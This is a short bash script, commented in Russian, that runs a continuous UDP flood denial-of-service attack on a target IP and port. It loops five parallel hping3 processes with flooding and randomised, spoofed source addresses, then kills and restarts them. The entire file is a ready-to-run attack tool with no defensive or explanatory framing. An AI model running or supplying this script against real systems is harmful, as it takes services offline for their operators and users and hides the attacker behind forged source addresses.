#!/bin/bash

echo "Starting UDP flood attack..."
echo "Target: $TARGET_IP:$TARGET_PORT"

# UDP flood атака с помощью hping3
while true; do
    # Запускаем несколько параллельных процессов UDP flood
    for i in {1..5}; do
        hping3 --udp -p $TARGET_PORT --flood --rand-source $TARGET_IP &
    done
    
    sleep 10
    # Убиваем все процессы hping3
    pkill hping3
    sleep 1
done 